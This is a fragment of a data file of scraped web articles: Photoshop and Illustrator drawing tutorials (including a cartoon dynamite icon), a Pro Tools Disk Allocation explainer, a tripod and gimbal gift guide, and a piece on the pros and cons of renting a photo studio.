Press Enter when done. \nGo to Edit > Transform > Scale , and scale the text down vertically. Don\u2019t forget to press Enter after you do so. \nMake sure that the original text layer is selected (active), and click the \u201c Lock transparent pixels \u201d icon in the Layers panel . Set the Foreground color to #689106 and pick the Paint Bucket Tool . Uncheck the Contiguous box in the Options bar then fill the white part with the Foreground color. \nStep 7 \nCreate a new layer on top of the original text layer. Pick the Polygonal Lasso Tool and draw a selection around the empty areas between the two text layers. \nOnce you create the selection fill it with the same Foreground color then get rid of the selection ( Ctrl + D ). \nDo the same for the rest of the letters, then merge this layer with the original text layer. \nStep 8 \nNext, we are going to use the Dodge Tool and Burn Tool to lighten and darken certain areas. \nPick the Dodge Tool , set the Range to Midtones and the Exposure to 30% (in the Options bar). If you are working on edges you\u2019ll need to select those edges (using the Polygonal Lasso Tool ) so that they look sharp, then, lighten the lower part of the selection. \nAs for curves, no need for selections. \nUse the Burn Tool with the same settings as the Dodge Tool to darken the areas left. \nUsing the Dodge and Burn tools help give depth to the 3D effect. \nFinal Image \nHope you enjoyed the tutorial and found it useful.",

      "text": "So far in this year\u2019s DIYP gift guides, we\u2019ve covered cameras , lenses , lights and bags . But whether you shoot stills or video, at some point you\u2019ll likely need something to mount your camera to. So here are some of the new ones that have come out over the last year or so and the ones that we use the most. \nJoby Handypod \u2013 $24.95 ( Amazon / B&H ) \nThe Joby Handypod is the new reigning champion of mini tripods for me. It usurps the popular Manfrotto PIXI (Amazon / B&H) due to the more ergonomic grip handle which makes it ideal for vlogging, and the fact that you can rotate the ball head on top vertically \u2013 perhaps not so useful for most video or photos, but great for Instagram Stories. They\u2019re super handy (the clue\u2019s in the name), and I think everybody should have one of these in their bag, ready to go at a moment\u2019s notice, even if they own bigger tripods. \nManfrotto Befree GT XPro \u2013 $290 ( Amazon / B&H ) \nThe Manfrotto Befree GT XPro is somewhat unique amongst travel tripods as it offers a centre column that can be rotated 90 degrees, allowing you to align it horizontally. This makes it ideal for both traditional photography as well as things like macro, letting you get closer to the subject without the legs getting in the way. Despite being in Manfrotto\u2019s \u201ctravel\u201d tripod category, it works very well as an everyday tripod, too, and has been my go-to lately. There\u2019s a carbon fibre version ( Amazon / B&H ) of the Befree GT XPro available, too, which is a little lighter, but just as solid. \nManfrotto 190x Video & 500 Fluid Head \u2013 $349 ( Amazon / B&H ) \nAs video tripods go, this is one of my favourites of 2019. It\u2019s based on Manfrotto\u2019s popular 190x legs, but with a centre column that features a levelling base. This means that the head you put on top of it (and your camera) stays level when you pan or tilt. It comes with the Manfrotto 500 fluid head, which offers pretty smooth pans and tilts for a lower budget head and I found it to be fantastic for shooting landscapes, video and timelapse while I was exploring Arizona earlier this year . \nManfrotto 635 Fast Single Leg Carbon \u2013 $749 ( B&H ) \nIf you\u2019re serious about video, you need a serious tripod. And the Manfrotto 635 Fast Single Leg is a serious tripod. It\u2019s designed for use with Manfrotto\u2019s Nitrotech Fluid Heads and will also be available in a kit that includes the Manfrotto Nitrotech 608 head ( Amazon / B&H ). The big advantage of the 635 Fast Single Leg tripod is that it can be set up and taken down quickly, keeping you mobile. It requires just a twist of the middle segment on each leg to lock and unlock the entire leg. It also features a built-in carry handle, which makes life on location so much easier when you have to move around a lot. \nSachtler Ace XL Fluid Head & Flowtech 75 Legs \u2013 $1,725 ( Amazon / B&H ) \nSpeaking of serious tripods, the Sachtler Flowtech 75 legs and Ace XL Fluid Head are going to be overkill for a lot of people out there. But as camera rigs get bigger and heavier, with monitors, lights, HDMI transmitters, microphone receivers, V-Mount batteries and all kinds of things attached to them, you need a solid tripod that can hold them. When you buy a tripod like this, you\u2019re buying a tripod for life, that will serve you very well with pretty much anything you choose to mount on it. \nZhiyun Crane M2 \u2013 $259 ( Amazon / B&H ) \nLet\u2019s kick off the gimbals with Zhiyun\u2019s recently released Crane M2. It\u2019s a very small gimbal designed for use with compact and very small mirrorless cameras, although it can also work with smartphones and action cameras, too. It\u2019s a super small gimbal for what it can carry that easily slips into your bag and makes you more inclined to actually use it. I\u2019ve lost track of the number of times I\u2019ve taken a gimbal with me somewhere, but then not used it because it\u2019s too big and unwieldy. The Crane M2 is a breeze to set up and use, though. \nZhiyun Weebill-S \u2013 $439 ( Amazon / B&H ) \nThe Zhiyun Weebill-S is an update to the popular Weebill LAB for mirrorless cameras and small DSLRs. It has an updated algorithm, stronger motors, ultra-low latency HD image transition and a new axis-locking mechanism similar to that found in the Crane 3 LAB ( Amazon / B&H ). It\u2019s a little larger than the Crane M2 shown above, but also features the underslung mode of the Crane 3 LAB, too, which makes for much more comfortable low angle shooting as well as an easier way to switch between high and low quickly. \nMoza AirCross 2 \u2013 $449 ( Amazon / B&H ) \nThe Moza AirCross 2 is a fairly small gimbal with big ambitions. It can handle loads up to a whopping 3.2kg. Sure, there are gimbals out there that can handle higher loads, but few at this relatively small size. It can also hold cameras like the Blackmagic Pocket 4K ( Amazon / B&H ) without having to use a cage or offset adapter plates and it will even let you mount the camera vertically, for when you want to be a little \u201cextra\u201d with your Instagram Story production value. \nMoza Slypod \u2013 $499 ( Amazon / B&H ) \nWe might as well start on the sliders with the weirdest looking one to be released this year. That\u2019s the Moza Slypod. It\u2019s a \u201c2-in-1\u201d slider and monopod, but it looks like no slider we\u2019ve ever seen before. Instead of a carriage and a standard dual-rail arrangement, this has one tube inside another that moves in and out to move your camera. It\u2019s a slider you just have to really try in order to understand the benefits, but it allows you to get some unique shots that would be difficult or impossible with other types of slider, especially when used in conjunction with a gimbal, like the AirCross 2 mentioned above. \nSyrp Genie II 3-Axis Kit \u2013 $2,827 ( B&H ) \nSyrp exploded onto the slider and motion control scene a few years ago and quickly established themselves as a leader in the field. The Syrp Genie II 3-axis kit allows for full movement along the 39\u2033 rail, 180\u00b0 of tilt and 360\u00b0 of pan. This isn\u2019t the only kit Syrp makes, but it is one of the most complete. You can always start your Syrp motion control journey with something like the Genie Mini II ( Amazon / B&H ) and then expand as you go one piece of gear at a time. But it\u2019s a system that\u2019s well worth looking into. \nOverview \nThere are so many options for supporting and stabilising your camera these days that it\u2019s almost impossible to settle on just one for all of our needs. Sometimes we need rock-solid stability above all else. Sometimes we need portability. Sometimes we need to move the camera while we\u2019re shooting. And sometimes it needs to move itself and just be left alone to do its thing. \nWhat\u2019s your favourite tripod, gimbal or slider? \nIf you haven\u2019t checked them out already, don\u2019t forget to look at our gift guides for cameras , lenses , lighting and bags . Tomorrow, we\u2019ll finish off our gift guide series with those invaluable accessories that make our lives easier and can sometimes be impossible to live without!",

      "title": "Understanding The Disk Allocation Window In Pro Tools - Expert Tutorial",
      "text": "In this free video tutorial , Paul Maunder lifts the lid off a much misunderstood part of Pro Tools - the Disk Allocation window. \nThe Disk Allocation window is often overlooked when using Pro Tools but understanding it and what it does can help to explain why imported files may not end up in the session's main audio files folder. \nPaul also covers the best ways of managing disk allocation and file locations and the importance of the 'Automatically copy files on import' option. \nMore On Disk Allocation\u2026 \nFor reasons we have never been able to get to the bottom of Pro Tools can sometimes change the Disk Allocation settings to another hard drive on your system, although it seems to handle much less on later versions of Pro Tools, so maybe Avid has nailed this one. \nDisk Allocation is a setting within Pro Tools that determines which hard drive any content on a track will be recorded onto. It is there because once you get beyond 24 or so tracks you need to be considering spreading your tracks across multiple hard drives if you want to keep Pro Tools happy. Yes I know you can have sessions with more than 24 tracks on one drive and get away with it, I have done it too on many occasions but the guidelines rightly say that once you get above 24 tracks you should be looking at more than one hard drive especially if your tracks are heavily edited. \nSo let's take a look at the Disk Allocation window. You get to this window from the Setup menu. \nThe Disk Allocation window takes the form of a table with two columns, the first lists each track in your session and the second shows where on your system any audio files recorded on that track will be saved. Normally as above, all the tracks in the Root Media Folder column should be set to the session folder on your external drive, in my case Work Disk 1 and the session folder \u201cMeet the Patels\u201d. However, there are times when these settings are not correct. The classic scenario when Disk Allocation will be wrong is when you have copied a session folder from one drive to another. When you open the session on the new drive you should always go into Disk Allocation and change the Root Media Folder settings to the new drive location, as Pro Tools won\u2019t do this for you. It still thinks the session is still on the old drive. You can do this by click and holding on the arrows at the right hand end of the Root Media Folder for that track and a contextual menu will come up. \nThe menu will contain all the drives that Pro Tools can record onto. Simply select the desired drive and it will change to that drive. You can change all of the tracks at once by holding down the Alt and clicking any track. Notice that all the tracks will be selected so that whatever you select on one will then be implemented on all the tracks. \nIt also seems that sometimes when you create a new track Disk Allocation can be set to another drive. I have wondered whether this has had anything to do with where on my system I have just been, say to import some audio, but I have never been able to nail it down, so the advice is to be aware and regularly check that Disk Allocation is set correctly. \nAnother tell-tale sign that disk allocation is not set correctly is that if you find a session folder on another drive which doesn\u2019t have a Pro Tools session in it but does have either and/or an audio files or fade files folders in it.",

      "text": "In this tutorial we\u2019ll do some freehand drawing to create a cute child icon. We\u2019ll be using a lot of gradients to make the icon look interesting and vivid. You can use a drawing tablet if you want, but even with a mouse you\u2019ll be totally fine working with smoothing functions of Adobe Illustrator. Let\u2019s get started! \nTutorial Details \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Pencil Tool, Stroke Panel, Shape Builder Tool, Gradient Tool, Pathfinder panel, Transparency panel \nEstimated Completion Time: 20 minutes \nFinal Image: Cute Child Icon \nStep 1 \nLet\u2019s find the Pencil Tool (N) icon in the Tools panel and double-click it to open up the settings. Set the Fidelity to Smooth and check the Fill new pencil strokes box, as shown in the screenshot below. \nDraw a rounded shape with a small bump on the left side for the cheek. This will be the head of the cute child icon. Once your pencil gets close to the starting point of the line, the path will close automatically. \nStep 2 \nFill the shape with any skin color that you want and make the shape smoother by using the Pencil Tool (N) while holding down Alt . Stroke along the edges, reducing the number of points. \nStep 3 \nLet\u2019s use a gradient to make the shape more dimensional. Open the Gradient panel (Window > Gradient) and apply skin colors to the gradient slider, making one of the tips slightly lighter. Set the Type of the gradient to Radial. \nTake the Gradient Tool (G) and drag it from the left side of the face to the right, as shown below. \nStep 4 \nLet\u2019s add a subtle shadow. Copy the shape and Paste in Front twice (Control-C > Control-F > Control-F). \nSelect the top shape and move it up and to the left a bit (I\u2019ve filled it with red color to make it more visible in the image below). \nSelect the shape that you moved and the one beneath it and apply the Minus Front function in the Pathfinder panel. \nNow let\u2019s apply a gradient from white to beige to the new shape. Set the Blending Mode to Multiply in the Transparency panel (Window > Transparency). White color becomes transparent when using the Multiply mode, creating a nice smooth transition between the shapes. \nStep 5 \nNow we\u2019ll create an eye. Take the Ellipse Tool (L) and make a 10 x 20 px shape (the size actually depends on the head shape that you\u2019ve create earlier, so you can resize the eye accordingly to make it fit). \nApply a dark linear gradient to give it more depth and Copy-Paste the shape in Back (Control-C > Control-B) . Make the bottom shape slightly larger and apply a gradient in the Multiply mode, creating a shadow, the same way as we did in the previous step. \nFinally, place a smaller circle on top of the eye, creating a highlight. Apply a gradient from blue to black in the Screen mode. When using this mode, the black color becomes transparent. \nStep 6 \nCreate a small oval for the eyebrow and use the Reflect Tool (O) to flip it to the opposite side. You can double-click the icon of the tool to open its settings, set the Axis to Vertical and click Copy. \nDon\u2019t make the brows perfectly symmetrical, keep them slightly different to create an interesting facial expression. \nStep 7 \nSwitch to the Pencil Tool (N) and draw an upside-down comma shape for the nose. Fill it with a Radial Gradient , making the tip of the nose slightly red. \nStep 8 \nKeep using the Pencil Tool (N) and draw an arched lines for the mouth. Set the Fill color to None and the Stroke to brown. Set the Stroke Weight to 4 pt either in the control panel on top or in the Stroke panel. Set the Variable Width Profile to Width Profile 1 , making the tips pointed. \nStep 9 \nNow let\u2019s add a subtle blush on the cheeks. Place two ovals on top of the cheeks, as shown below. \nSelect both ovals and the head shape. Take the Shape Builder Tool (Shift-M) , hold down Alt and click the parts of the ovals outside the head to delete them. \nStep 10 \nApply a subtle Radial Gradient from pink to white and set it to Multiply mode. \nStep 11 \nNow let\u2019s draw the hair. Take the Pencil Tool (N) and create a rounded blobby shape. Fill it with a radial gradient of any hair color of your choice, making the top part slightly lighter. This trick is always helpful and adds some volume to the shape. \nStep 12 \nDon\u2019t forget to add an ear! You can use either the Ellipse Tool (L) or draw it by hand using the Pencil Tool (N) , making it look more stylized. Fill the inner shape with a darker gradient in Multiply mode, depicting a cavity. \nStep 13 \nLet\u2019s attach the ear to the head so that it doesn\u2019t look like a separate shape. You can duplicate (Control-C >Control-F) the head shape in case if you\u2019re afraid to destroy it somehow. \nSelect the head shape and the ear shape and take the Shape Builder Tool (Shift-M). \nClick and drag a line across the overlapping part of the shapes. When you see both shapes become grey and merged, release the mouse key to apply the action. At this point, the head shape will jump on top. Select it and press Shift-Control-[ to Send to Back. \nThere we have it! As you can see, now the edge of the ear shape repeats the shape of the edge of the head. You can play with the colors of the gradient to find a perfect match. \nStep 14 \nWe\u2019re almost there! Let\u2019s add an outline around the head to separate the cute child icon from the background. \nFirst of all, Group (Control-G) all the elements of the head. \nCopy the group and Paste in Back (Control-C > Control-B). \nKeeping the copy selected, use the Unite function in the Pathfinder panel to merge all the elements of the group into one single shape. \nNow we can apply a Stroke to the created silhouette and increase its Width to create a thick outline around the cute child icon. \nHey-hey! Our Cute Child Icon is Finished! \nGreat work guys! Now you can create a set of different cute child icons, adding diversity to your project and creating some cute children designs. \nI hope you\u2019ve enjoyed this tutorial and learned something new. \nHave fun! \nThe post How to Draw a Cute Child Icon in Adobe Illustrator appeared first on Vectips .",

      "title": "How to Make a Tentacle Art Brush in Adobe Illustrator",
      "text": "Always wanted to create an art brush, but never knew exactly how to do it? \nWell, if you love unique creative brushes and text effects and you want to learn how to make a brush in Illustrator, then this tutorial is perfect for you. You will go through the entire process, from drawing the shape to saving it correctly and then applying the brush to obtain a fun text design. By the end of this tutorial, you will have the knowledge to create other Adobe Illustrator brushes and use them in future projects. \nExpand your brush library by going to GraphicRiver , where you'll find an amazing selection of brushes in various styles, shapes, and themes. Also, check out the text effects section, where you'll find plenty of resources and inspiration for your next projects. \nLet's start the fun! \n1. How to Create a New Document \nLaunch Illustrator and go to File > New to open a blank document. Type a name for your file, set the dimensions, and then select Pixels as Units and RGB as Color Mode . \nNext, go to Edit > Preferences > General and set the Keyboard Increment to 1 px and while there, go to Units to make sure they are set as in the following image. I usually work with these settings, and they will help you throughout the drawing process. \n2. How to Create the Basic Tentacle Shape \nStep 1 \nGrab the Rectangle Tool (M) and draw a 672 x 88 px rectangle on your artboard. Keep this shape selected and go to the Transform panel. Enter a Corner Radius of 42 px in the top left and bottom left corners in order to obtain the rounded corners. \nStep 2 \nUse the Add Anchor Point Tool (+) to add an extra point in the middle right side of the rectangle. A guideline can make this easier for you (1). Now, switch to the Delete Anchor Point Tool (-) and delete the two corner points on the right side (2) to obtain the sharp end (3). \nWith the help of the Convert Anchor Point Tool (Shift-C) , click on the sharp end and drag the short handles to make the tip of the tentacle slightly smoother (4). \nStep 3 \nWe are going to add details and shading to the tentacle. Use the Pen Tool (P) or the Line Segment Tool (\\) to draw a straight line from the top left side to the tip. Give it a 1 pt Stroke with any color; then go to Effect > Distort & Transform > Roughen and apply the settings shown. This will create a random zig-zag path that should not go over the top edge of the tentacle shape. \nStep 4 \nWhile the path stays selected, choose Expand Appearance from the Object menu in order to expand the Roughen effect applied (1). Now, grab the Pen Tool (P) and close the path between the two end points to obtain a new shape (2). \nNext, select the tentacle shape and then Copy and Paste in Front (Control-F) to make a copy of it. Keep this copy selected, along with the newly obtained zig-zag shape, and press Intersect in the Pathfinder panel (3). \nStep 5 \nRepeat the previous two steps and apply the same settings to create a similar shape in the bottom part of the tentacle. \nThese are the three main shapes that make up the brush: the top and bottom shading shapes and the tentacle shape. We will continue with the coloring and other details. \n3. How to Create the Front View of the Tentacle Brush \nStep 1 \nFirst, color the tentacle shape with red and the two shading shapes with a darker shade of red as shown. Zoom as much as needed and draw a small shape on the tip with the Pen Tool (P) . Color it with dark red just like the shading shapes. \nStep 2 \nWe will continue with the suckers on the tentacle. \nUse the Ellipse Tool (L) to draw a small 24 x 24 px circle on your artboard and color it with pink (1). Keep this circle selected, and press Add New Fill at the bottom of the Appearance panel in order to add a second fill attribute above the first. Change the color to a lighter shade of pink; then go to Effect > Path > Offset Path and apply an Offset of -6 px . This will create the appearance of a smaller circle in the center (2). \nWith the circle still selected, apply a 2 pt Stroke using a darker shade of pink. Go to Effect > Path > Offset Path and apply an Offset of -6 px again to make a stroke of the same size for the inner circle (3). \nStep 3 \nWith the circle still selected, press Add New Fill to add a third fill attribute at the bottom of the Appearance panel. Use the color indicated and then go to Effect > Distort & Transform > Transform . Type 1.5 px in the Move Vertical field and you will obtain a shadow at the bottom of the sucker. \nStep 4 \nWith the circle still selected, press Add New Fill again to add a fourth fill attribute at the bottom of the Appearance panel. Use a darker color; then go to Effect > Warp > Inflate and apply a 10% Bend . Next, go to Effect > Distort & Transform > Transform and type 4 px in the Move Vertical field. Hit OK and you will obtain a darker shadow at the bottom of the sucker. \nStep 5 \nLet's get back to the tentacle. Move the sucker to the bottom left side and, before you scale it down, make sure that Scale Corners and Scale Strokes & Effects are selected in the Transform panel. Now, go to Object > Transform > Scale and type 20% in the Scale Uniform field. Hit Copy and you will get a tiny copy of the sucker that you need to move to the opposite side of the tentacle (1). \nKeep both suckers selected and go to Object > Blend > Blend Options . Choose 30 Specified Steps , hit OK , and then go back to Object > Blend > Make (Alt-Control-B) (2). Illustrator will automatically create the in-between suckers. Easy, right? \nStep 6 \nKeep the resulting blend-group selected and go to Object > Blend > Expand in order to get the individual suckers (1). Select each one of them and rearrange them a little to ensure a more realistic result for the final Illustrator brush. \nUse the technique explained to create the second row of suckers at the top of the tentacle, and this will complete the front view of the brush (2). \nStep 7 \nMaking a brush in Illustrator and saving it correctly can be easy, especially for art brushes. There is no need to expand the appearance in this case, so simply select all the shapes and drag everything to the Brushes panel to save it as a New Art Brush . In the Art Brush Options window, all you have to do is type \u201c Tentacle Art Brush 1 \u201d as the name and leave the rest of the settings as they are. Hit OK . \n4. How to Create the Side View of the Tentacle Brush \nStep 1 \nUse the Ellipse Tool (L) to draw a 33 x 17 px ellipse on your artboard and color it pink. Press Add New Fill in the Appearance panel to add a second fill attribute above the first, as you did for the other sucker. Use a lighter shade of pink; then go to Effect > Distort & Transform > Transform and apply the settings shown to create the appearance of a smaller ellipse in the middle. \nStep 2 \nWith the ellipse still selected, apply a 3 pt Stroke using a darker shade of pink, and then go to Effect > Distort & Transform > Transform . Apply the same settings as before so the stroke and the inner circle have the same size and position. \nStep 3 \nNext, use the Pen Tool (P) to draw a curved path on each side, and after that, send them under the ellipse in the Layers panel. Give them a 4 pt Stroke using the color indicated and Width Profile 5 in the Stroke panel (1). \nDraw another curved path under the ellipse. Give it a 2 pt Stroke using the color indicated and Width Profile 1 (2). \nStep 4 \nGo back to the tentacle made earlier and select only the main shape along with the bottom shading shape. Make copies of them so you can create the second tentacle brush. \nGroup (Control-G) all the paths that make up the sucker and move it to the middle left side of the tentacle. Before you scale it down, make sure that Scale Corners and Scale Strokes & Effects are selected in the Transform panel. Now, go to Object > Transform > Scale and type 30% in the Scale Uniform field. Hit Copy and you will get a tiny copy of the sucker. Move it to the opposite side of the tentacle (1). \nSelect both suckers and go to Object > Blend > Blend Options . Choose 18 Specified Steps , hit OK , and then go back to Object > Blend > Make (Alt-Control-B) . Illustrator will automatically create the in-between suckers for you (2). \nStep 5 \nSelect the resulting blend group and go to Object > Blend > Expand in order to get the individual suckers (1). Rearrange them a little to ensure a more realistic result for the final Illustrator brush (2). \nSelect the entire row of suckers and then Copy and Paste in Back (Control-B) to make a copy of it. Move it upwards to get the second row of suckers at the top of the tentacle (3). To complete the side view of the brush, make six smaller copies of the sucker and arrange them at the tip, but without the dark stroked paths on the sides of the ellipse (4). \nStep 6 \nIt's time to save the second Illustrator brush. Select all the shapes and drag everything to the Brushes panel to save it as a New Art Brush . In the Art Brush Options window, all you have to do is type \u201c Tentacle Art Brush 2 \u201d as the name and leave the rest of the settings as they are. Hit OK . \n5. How to Create the Tentacles Text Effect \nStep 1 \nYou have successfully created and saved the two Adobe Illustrator brushes, so now you will learn how to apply them and create a unique text effect. \nWe are going to start creating the shape of the letters, so grab the Pen Tool (P) and draw two paths that make up the letter \u201cP\u201d. The word we are designing is \u201cPULPO\u201d, meaning octopus in Spanish. \nStroke one of the paths with the Tentacles Art Brush 1 and the other with the Tentacles Art Brush 2 by selecting them from the Brushes panel. Set the Stroke Weight to 0.35 pt and use the same value for all the paths to ensure a consistent look for the text design. \nStep 2 \nContinue to create the rest of the letters. You can be creative and put your own twist on it. Use the two brushes to stroke these paths and decide for which path you want a front view or a side view. Make extra adjustments until you are happy with the placement of each path. \nStep 3 \nIn the next steps, we will create the appearance of tentacles twisting with each other with the help of Opacity masks. \nFocus on the first letter, select only one of the tentacle stroked paths, and then Copy and Paste in Place (Shift-Control-V) to make a copy of it. Go to Object > Expand Appearance followed by Object > Expand . This will expand all the stroke attributes involved in the making of the brush. Next, press Unite in the Pathfinder panel and you will obtain a single shape. \nRepeat the same process for the other path and obtain the second compound path that we need (1). \nWhile the newly obtained shapes stay selected, grab the Shape Builder Tool (Shift-M) and click on one of the intersecting areas to split the shapes. For this letter, we want to mask the top tentacle, so keep only those three resulting shapes and delete the rest. Color them white and black, and put black where you want to mask that area and make it invisible (2). \nStep 4 \nGroup (Control-G) the black and white shapes and keep them selected along with the stroked tentacle path underneath; then go to the Transparency panel and choose Make Opacity Mask from the drop-down menu. \nThe areas filled with white remain visible and nothing is changed, while the area/areas filled with black become invisible, creating the appearance of the tentacle going under the other one. You can see the before and after in the image below. \nStep 5 \nApply the technique explained above for the other tentacles, where needed, to create the same design. \nStep 6 \nShadows usually make text effects look more convincing and stand out, so let's add some. Grab the Pen Tool (P) and draw a path as shown below, in the area where the tentacles are overlapping. Give it a 2 pt Stroke using black and Width Profile 1 in the Stroke panel. Next, go to Effect > Blur > Gaussian Blur and apply a Radius of 2 px to make the shadow smoother. Send this path between the two tentacles in the Layers panel (1). \nDraw more paths in other overlapping areas and apply the same settings (2). \nStep 7 \nRepeat the previous step and create shadows for the rest of the letters. Use the same settings for each path. \n6. How to Create the Shadow Behind the Tentacles Text Effect \nStep 1 \nSelect one of the tentacle stroked paths and go to Object > Expand Appearance followed by Object > Expand . Next, press Unite in the Pathfinder panel to get a single shape (1). \nRepeat this process for the other tentacle paths to get all the shapes that we need (2). Once done, press Unite in the Pathfinder panel followed by Object > Compound Path > Make (Control-8) to merge all of them into a new compound path (3). \nStep 2 \nSend the newly obtained shape behind the text design in the Layers panel. Next, go to Effect > Stylize > Drop Shadow and apply this effect to obtain the shadow. Go back to Effect > Stylize and apply the Outer Glow effect to obtain a subtle white glow around the text effect. \nHere are the settings for the Drop Shadow and Outer Glow effects: \n7. How to Create the Water Droplets \nStep 1 \nUse the Pen Tool (P) to draw the shape of a droplet on your artboard. Color it blue (1). Copy and Paste in Front (Control-F) this shape and change the fill color to green for visual reasons only. Copy and Paste in Front (Control-F) the green shape again and move it a little to the left by pressing the Left Arrow key on your keyboard twice. While the green and orange shapes stay selected, press Minus Front in the Pathfinder panel (2). \nColor the resulting shape with the same blue, but set the Blending Mode to Multiply and reduce the Opacity to 28% . This will be the shading on the right side of the droplet (3). \nTo add a highlight, draw a curved path on the left side of the droplet using the Pen Tool (P) . Give it a 2 pt Stroke using white and Width Profile 5 in the Stroke panel. Reduce the Opacity to 68% (4). \nStep 2 \nGroup (Control-G) all the paths that make up the droplet and make copies of them. Scale them up or down and arrange more droplets around the tentacles as splashes. \nFollowing the same technique, you can create droplets of different shapes for a more realistic look. Arrange as many water droplets as you want until you are happy with your text design. \nCongratulations! You're Done \nHere is the final image of the tentacles text effect. I hope this tutorial was fun for you and that you learned some new techniques today. Now you have the knowledge to make other creative Adobe Illustrator brushes and text effects in your projects. \nDon't forget to share your recreation of this tentacles text effect with us.

      "title": "Why Rent a Photo Studio? A Look at the Pros and Cons",
      "text": "If you are like a lot of photographers, you are used to shooting outdoors at a park, the beach or on the city streets somewhere. You guerrilla shoot in interesting locations with whatever gear you have or feel you can get away with. \nMaybe you\u2019ve even shot in a hotel or someone\u2019s house, but shooting inside a studio never crossed your mind. Or maybe it did but it felt a little intimidating with all the professional equipment. What you\u2019re doing works for you and you may be wondering, \u201cWhy would I rent a photo studio?\u201d \nStudio shooting has a lot of great upsides but also a few limitations to consider. Let\u2019s start with the upsides to studio shooting. \nUpsides \nNo Permits \nEven though most photographers don\u2019t bother with permits many popular locations do require permits for shooting, especially here in Southern California. Depending on the location they may be more forgiving or lenient but truth be told most places photographers like to shoot have permit requirements. \nGuerrilla shooting has become the norm throughout Southern California, but renting a studio means you don\u2019t have to chance it. Sometimes the fines can be more than the permit itself. \nNear Total Control \nShooting outdoors requires flexibility and sometimes enormous amounts of it. Things like the weather, other people and even lighting can change without notice and things you planned to do may be delayed or even scrapped altogether for that shoot. You can plan to reshoot the original ideas another time, but now you have lost valuable time for your project. \nWhen shooting inside a studio, those things are within your control. You can plan and execute the shoot without having to worry about most things out of your control. \nComforts and Conveniences \nWhen you shoot inside a studio there are some great creature comforts we take for granted everyday that become sorely missed when on location outside. Things like temperature control, privacy, and bathrooms become a second thought until you are in the middle of a shoot in a park, the woods or a beach and your model needs to change outfits or that large drink you grabbed on the way comes back to haunt you. \nPrivacy and Safety \nShooting in an indoor private area will allow you to control who is around the shoot. You won\u2019t have to deal with gawkers and self-styled paparazzi encroaching or interfering with your team. You also won\u2019t have to worry about things showing up on social media when strangers stop and post about what they just saw. \nCosts \nDepending on the studio you are looking to rent your investment costs may be very minimal. Some studios will have lighting gear and accessories included as well as props and furniture. Not having to invest in these items could save you thousands of dollars long term. You also don\u2019t have to worry about wear and tear or upkeep on that equipment. \nHelping Hand \nHave some heavy gear, need help setting props, have questions about lights? Most studios have staff on hand that can assist with simple things for no charge. Some even have staff that can be hired for a small additional fee to be a grip or lighting assistant on set. You may not need those extra hands but on those small occasions when you do having someone right there you can call on can be a big help. \nProps and Equipment \nThis definitely varies from studio to studio but you may find that the studio you are looking at has some themed props or specialized equipment that you can use or try out. This can help you try new things before you buy or invest in equipment. It could take your shoot to another level by using their accessories and props to dress up your shoot. \nLess to Haul \nEven if you have your own equipment and lighting another perk of renting a studio is that you have less to haul. You can use the studio equipment instead of having to bring all of your gear with you. Or you can bring some that the studio might not have but that still means less for you to pack, carry, and haul to and from the shoot. \nAnd now the limitations in renting a studio: \nLimitations \nTime Constraints Equals Better Planning \nNot the biggest of issues but be aware you may be under harder time constraints. We\u2019ve all had that shoot that is either going so well that you don\u2019t want to stop, or, on the flip side, things aren\u2019t going according to plan or taking longer than expected. \nWhen renting a studio, if you run out of time, you don\u2019t have many options. You may be able to add more time and extend, but this will depend on the studio\u2019s calendar. If there are appointments after yours, the studio may not be able to accommodate the request. \nThe easy fix here is twofold: better pre-planning and communication with your team and when you book plan for a little buffer time on your appointment. Having an extra hour on your appointment means you won\u2019t have to stress about the shoot running out of time. \nOutdoor Settings \nThis is probably the biggest downside to shooting inside a studio. Hollywood may be able to build sound stages that resemble wooded areas, beach scenes, and other large scale outdoor locations but realistically space and budget constraints will keep the majority of us from making this happen well. There are some small options like backdrops and props but it really won\u2019t look close to the real thing on small budgets. \nFX/Content Restrictions \nItems such as pyrotechnics, smoke bombs, and glitter are banned in most studios. In fact, so are messy shoots like paint and milk splatters/throws. \nYou should always check with the studio managers prior to booking to see what the restrictions are for a particular studio. Many times there will be no getting around these restrictions. For your team\u2019s safety and the well being of the studio, some shoots should just be avoided or done in an open area where the danger can be controlled and a team can be at the ready in the off chance something does happen. \nAbout the author : Slevin Mors is the owner of Elysium Studio , a rental studio in Garden Grove, California.

      "text": "In today\u2019s tutorial, we\u2019re going to put on our little western hats and learn how to create a dynamite stick icon using some of the basic geometric shapes and tools that you probably already work with on a daily basis. \nThat being said, quickly grab a fresh cup of that wild bean coffee and let\u2019s get started! \nTutorial Details: Dynamite Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2018 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 30 Minutes \nFinal Image: Dynamite Icon \nStep 1 \nAs we do with every new project, we\u2019re going to kick things off by setting up a New Document by going over to File > New (or using the Control-N keyboard shortcut), which we will adjust as follows: \nNumber of Artboards: 1 \nWidth: 64 px \nHeight: 64 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nStart working on the actual dynamite icon, by creating the main shape for the center dynamite stick using a 12 x 52 px rounded rectangle with a 4 px Corner Radius , which we will color using #EF855B , and then position to the center of the underlying Artboard using the Align panel\u2019s Horizontal and Vertical Align Center options. \nStep 3 \nGive the shape that we\u2019ve just created an outline using the Stroke method, by creating a copy of itself ( Control-C ) which we will paste in front ( Control-F ) and then adjust by first changing its color to #383C44 . Then, flip its Fill with its Stroke ( Shift-X ) setting its Weight to 4 px and its Corner to Round Join . Before we move on, make sure you select both shapes and group them together using the Control-G keyboard shortcut. \nStep 4 \nAdd the side sticks using two copies ( Control-C > Control-F twice) of the one that we\u2019ve just finished working on, which we will position onto the sides of the original, making sure their outlines overlap. Once you have the copies in place, select and group ( Control-G ) all three sticks together, before moving on to the next step. \nStep 5 \nCreate the rope segments using two 40 px wide 4 px thick Stroke lines ( #383C44 ) with a Round Cap , which we will position at a distance of 4 px from the sticks\u2019 top and bottom edges. Once you\u2019re done, select and group all of the current shapes together using the Control-G keyboard shortcut. \nStep 6 \nStart working on the trigger mechanism by creating the belt using a 40 x 12 px rectangle ( #B58362 ) with a 4 px thick outline ( #383C44 ) with a Round Join which we will group ( Control-G ) and then position to the center of the underlying dynamite 